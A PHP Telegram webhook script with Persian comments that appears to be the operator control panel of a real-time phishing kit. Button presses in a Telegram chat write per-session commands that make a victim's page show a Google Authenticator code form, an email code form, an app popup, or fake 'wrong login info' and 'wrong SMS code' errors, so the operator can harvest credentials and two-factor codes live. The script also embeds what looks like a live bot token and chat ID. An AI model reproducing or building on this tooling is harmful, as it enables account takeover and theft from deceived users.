<?php
// [مهم] مسیر پوشه دستورات با اسلش انتهایی
define('COMMAND_DIR', '/home/booksqui/command_files/');

// توکن ربات شما
$botToken = "5552889968:AAHoZ28xu83J-jVp0lCeuNJyShbzZG9WLfc";
$chatId = "-1001999042119"; // <<-- شناسه چت را اینجا هم تعریف کنید

// اطمینان از وجود پوشه و قابل نوشتن بودن آن
if (!is_dir(COMMAND_DIR) || !is_writable(COMMAND_DIR)) {
     error_log("Webhook Critical Error: Command directory issue: " . COMMAND_DIR);
     header('HTTP/1.1 500 Internal Server Error'); exit('Server configuration error regarding command directory.');
}

// --- توابع کمکی برای فایل (کپی شده از telegram_handler.php) ---
function getFilePath($sessionId, $type) {
    $safeSessionId = preg_replace('/[^a-zA-Z0-9_-]/', '', $sessionId);
    if (empty($safeSessionId)) { error_log("Webhook getFilePath Error: Invalid session ID."); return null; }
    $safeType = preg_replace('/[^a-zA-Z0-9]/', '', $type);
    if (empty($safeType)) { error_log("Webhook getFilePath Error: Invalid file type."); return null; }
    $dir = rtrim(COMMAND_DIR, '/') . '/';
    return $dir . $safeSessionId . '.' . $safeType;
}
function readDataFromFile($sessionId, $type) {
    $filePath = getFilePath($sessionId, $type);
    if ($filePath && file_exists($filePath) && is_readable($filePath)) {
        $content = @file_get_contents($filePath);
        if ($content !== false) { return trim($content); }
        else { error_log("Webhook readDataFromFile Error reading: " . $filePath); }
    }
    return null;
}

// --- توابع API تلگرام (کپی شده از telegram_handler.php) ---
function answerCallbackQuery($botToken, $callbackQueryId, $text = null, $showAlert = false) {
    $url = "https://api.telegram.org/bot" . $botToken . "/answerCallbackQuery"; $params = ['callback_query_id' => $callbackQueryId];
    if ($text !== null) { $params['text'] = $text; $params['show_alert'] = $showAlert; }
    $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params)); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $result = curl_exec($ch); $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE); $curlError = curl_error($ch); curl_close($ch);
    if ($curlError) { error_log("Webhook answerCallbackQuery cURL Error: " . $curlError); return false; } if ($httpcode != 200 || !$result) { error_log("Webhook answerCallbackQuery HTTP Error: Code $httpcode, Response: " . $result); return false; }
    $response = json_decode($result, true); if (!$response || !isset($response['ok']) || !$response['ok']) { error_log("Webhook answerCallbackQuery API Error: Response: " . $result); return false; } return true;
}
// **تغییر جدید: اضافه کردن تابع ویرایش پیام به webhook**
function editMessageTextInTelegram($botToken, $chatId, $messageId, $newMessage, $keyboard = null) {
    $url = "https://api.telegram.org/bot" . $botToken . "/editMessageText";
    $postFields = ['chat_id' => $chatId, 'message_id' => $messageId, 'text' => $newMessage, 'parse_mode' => 'HTML'];
    if (is_array($keyboard)) { // Allow null or empty array
        $replyMarkup = json_encode(['inline_keyboard' => $keyboard]);
         if ($replyMarkup) { $postFields['reply_markup'] = $replyMarkup; }
         else { error_log("Webhook editMessageTextInTelegram Error: Failed to encode keyboard JSON."); }
    }
    $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postFields)); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $output = curl_exec($ch); $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE); $curlError = curl_error($ch); curl_close($ch);
    if ($curlError) { error_log("Webhook editMessageText cURL Error: " . $curlError . " for Message ID: $messageId"); return false; } $editedSuccessfully = false;
    if ($httpcode == 200 && $output) { $response = json_decode($output, true); if (isset($response['ok']) && $response['ok']) { $editedSuccessfully = true; } else if (isset($response['description'])) { if (strpos($response['description'], 'message is not modified') !== false) { $editedSuccessfully = true; } else { error_log("Webhook Telegram API error editing message $messageId: " . $response['description'] . " | Response: " . $output); } } else { error_log("Webhook editMessageText failed (HTTP 200 but OK false/missing): Response: " . $output . " for Message ID: $messageId"); } } else { error_log("Webhook editMessageText HTTP Error: Code $httpcode, Response: " . $output . " for Message ID: $messageId"); } return $editedSuccessfully;
}

// دریافت آپدیت از تلگرام
$content = file_get_contents("php://input"); $update = json_decode($content, true);

// بررسی اولیه آپدیت
if (!$update || !isset($update["callback_query"])) { error_log("Webhook: Not a callback_query."); if (!headers_sent()) { header('HTTP/1.1 200 OK'); } exit; }

$callbackQuery = $update["callback_query"]; $callbackId = $callbackQuery['id']; $userId = $callbackQuery['from']['id']; $callbackData = $callbackQuery['data'] ?? null;

// بررسی callback_data
if ($callbackData === null || $callbackData === '') { error_log("Webhook: callback_query missing 'data'."); answerCallbackQuery($botToken, $callbackId, "خطا: اطلاعات دکمه نامعتبر.", true); if (!headers_sent()) { header('HTTP/1.1 200 OK'); } exit; }

error_log("Webhook received callback_data: '{$callbackData}' from user: {$userId}");

// تجزیه callback_data
$parts = explode(':', $callbackData, 3); $commandAction = $parts[0] ?? null;
$sessionId = isset($parts[1]) ? preg_replace('/[^a-zA-Z0-9_-]/', '', $parts[1]) : null;

// بررسی شناسه جلسه
if (empty($sessionId)) { error_log("Webhook: Invalid Session ID in callback_data: '" . $callbackData . "'"); answerCallbackQuery($botToken, $callbackId, "خطا: شناسه جلسه نامعتبر.", true); if (!headers_sent()) { header('HTTP/1.1 200 OK'); } exit; }

// --- پردازش دستور و ایجاد فایل ---
$commandToStoreInFile = null; $responseText = "دستور نامشخص";
$removeKeyboardAfterProcessing = false; // <<-- فلگ برای کنترل حذف کیبورد

switch ($commandAction) {
    case 'request_ga_code':
        $commandToStoreInFile = 'show_ga_form';
        $responseText = "درخواست نمایش فرم GA ارسال شد.";
        $removeKeyboardAfterProcessing = true; // <<-- بعد از این دستور کیبورد حذف شود
        break;
    case 'request_email_code':
        $commandToStoreInFile = 'show_email_form';
        $responseText = "درخواست نمایش فرم ایمیل ارسال شد.";
        $removeKeyboardAfterProcessing = true; // <<-- بعد از این دستور کیبورد حذف شود
        break;
    case 'request_app_popup':
        $commandToStoreInFile = 'show_app_popup';
        $responseText = "دستور نمایش پاپ آپ اپ ارسال شد.";
        $removeKeyboardAfterProcessing = false; // کیبورد باقی بماند؟ (بستگی به نیاز دارد)
        break;
    case 'wrong_info':
        $commandToStoreInFile = 'show_login_error:اطلاعات ورود نادرست';
        $responseText = "دستور نمایش خطای اطلاعات نادرست ارسال شد.";
        $removeKeyboardAfterProcessing = true; // <<-- بعد از این دستور کیبورد حذف شود
        break;
    case 'wrong_sms':
        $commandToStoreInFile = 'show_sms_error:کد وارد شده صحیح نیست';
        $responseText = "دستور نمایش خطای کد SMS ارسال شد.";
        $removeKeyboardAfterProcessing = true; // <<-- بعد از این دستور کیبورد حذف شود
        break;
    default:
        error_log("Webhook: Unknown command action: '" . $commandAction . "' for Session ID: " . $sessionId);
        answerCallbackQuery($botToken, $callbackId, "دستور نامشخص: " . htmlspecialchars($commandAction), true);
        if (!headers_sent()) { header('HTTP/1.1 200 OK'); } exit;
}

// نوشتن فایل دستور
if ($commandToStoreInFile !== null) {
    $commandFilePath = rtrim(COMMAND_DIR, '/') . '/' . $sessionId . '.command';
    if (file_put_contents($commandFilePath, $commandToStoreInFile, LOCK_EX) !== false) {
        @chmod($commandFilePath, 0660);
        error_log("Webhook: Stored command '{$commandToStoreInFile}' in file: " . $commandFilePath);
        // پاسخ به کلیک دکمه
        answerCallbackQuery($botToken, $callbackId, $responseText, false);

        // **تغییر جدید: حذف کیبورد در صورت نیاز**
        if ($removeKeyboardAfterProcessing) {
            // خواندن شناسه و متن پیام قبلی
            $messageId = readDataFromFile($sessionId, 'msgid');
            $messageText = readDataFromFile($sessionId, 'msgtext');

            if ($messageId && $messageText) {
                 error_log("Webhook: Attempting to remove keyboard from message ID: $messageId for session: $sessionId");
                 // ویرایش پیام برای حذف کیبورد (ارسال متن قبلی با کیبورد خالی)
                 $edited = editMessageTextInTelegram($botToken, $chatId, $messageId, $messageText, []); // ارسال آرایه خالی برای حذف کیبورد
                 if ($edited) {
                      error_log("Webhook: Keyboard removed successfully for message ID: $messageId");
                 } else {
                      error_log("Webhook: FAILED to remove keyboard for message ID: $messageId");
                 }
            } else {
                 error_log("Webhook: Cannot remove keyboard. Missing messageId or messageText for session: $sessionId");
            }
        }

    } else {
        error_log("Webhook: FAILED to write command file: " . $commandFilePath . " for Session ID: " . $sessionId);
        answerCallbackQuery($botToken, $callbackId, "خطا در ذخیره دستور در سرور.", true);
    }
}

// ارسال پاسخ 200 OK به تلگرام
if (!headers_sent()) { header('HTTP/1.1 200 OK'); } exit;
?>